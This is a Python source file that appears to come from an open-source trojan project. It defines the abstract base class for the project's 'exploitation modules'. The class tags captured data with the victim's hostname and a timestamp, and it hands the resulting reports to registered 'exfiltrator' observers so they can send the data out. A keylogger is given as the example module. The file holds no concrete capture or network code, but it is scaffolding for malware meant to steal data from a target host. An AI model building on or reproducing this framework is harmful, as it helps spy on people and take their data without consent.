#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import platform
from datetime import datetime


class ExploitationModule(abc.ABC):
    def __init__(self, exfil_time: float):
        """Interface for the implementation of exploitation modules."""
        self.exfil_time = exfil_time
        self._exfiltrators = list()
        self.tag = f"{self.__class__.__name__}::{platform.node()}"

    def register_exfiltrator(self, exfiltrator) -> None:
        """Register an observer to enable output or exfiltration of
        captured data from the target host."""
        self._exfiltrators.append(exfiltrator)

    def _notify_all_exfiltrators(self) -> None:
        """Send captured data to each registered observer for final
        exfiltration."""
        message: str = self.report()
        [exfiltrator.update(message) for exfiltrator in self._exfiltrators]

    def report(self) -> [str, None]:
        """Get a report based on the data buffered by the
        ExploitationModule as a string consisting of a tag, timestamp
        and the data itself."""
        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
        header = f"[{self.tag}] @ {timestamp}"
        '''The standard report is formatted as follows:
        [KeyLogger::hostname] @ 10/16/2021 13:30:20 - my data'''
        if len(self.contents) > 0:
            return f"{header} - {self.contents}"

    @property
    @abc.abstractmethod
    def contents(self):
        """Get a representation of the data made available by the
        module for exfiltration."""

    @abc.abstractmethod
    def execute(self, *args, **kwargs):
        """To be implemented with the logic specific to each
        exploitation mechanism."""
